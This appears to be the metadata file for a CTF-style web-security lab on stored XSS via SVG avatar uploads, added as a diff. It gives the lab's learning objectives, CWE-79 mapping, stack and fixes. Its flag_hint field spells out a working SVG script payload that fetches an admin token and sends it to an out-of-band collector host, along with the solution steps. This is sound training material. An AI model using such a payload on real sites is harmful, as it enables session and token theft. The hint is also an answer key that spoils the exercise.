@@ -1,0 +1,46 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "stored-xss-svg-avatar-upload",
+  "title": "Stored XSS via SVG Avatar Upload (image/svg+xml + <object>)",
+  "track": "xss",
+  "difficulty": "practitioner",
+  "estimated_minutes": 40,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Recognise that a user-uploaded SVG served with Content-Type image/svg+xml is an executable HTML/JS document, not an inert image",
+    "Understand why <img src> rasterises an SVG safely but <object>/<iframe>/direct navigation run its <script> in the app's origin",
+    "Defeat weak upload validation that trusts a declared MIME type and a `<svg` magic-prefix while never stripping scripts or event handlers",
+    "Chain same-origin fetch of an admin-only endpoint from an injected script — the cookie rides along automatically, even against HttpOnly",
+    "Name the real fixes: serve user SVGs as text/plain or through an image proxy, sanitise the markup, and apply a script-blocking CSP"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["stored-xss-comment-plain"],
+  "flag_hint": "Upload an SVG avatar whose body is <svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('/admin/token').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?t='+encodeURIComponent(t)})</script></svg> (multipart, Content-Type image/svg+xml). POST /report the returned /u/<uuid>; the admin bot loads it and the <object>-embedded SVG runs. Read the token via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "SVG avatar upload served image/svg+xml + <object> embed",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "stored-xss",
+    "svg",
+    "file-upload",
+    "mime-sniffing",
+    "object-embed",
+    "same-origin-fetch",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The classic stored-XSS-via-SVG-upload pattern (a scripted image/svg+xml served as a document and embedded with <object>), abstracted for local Docker with a Playwright victim bot and an OOB collector"
+}
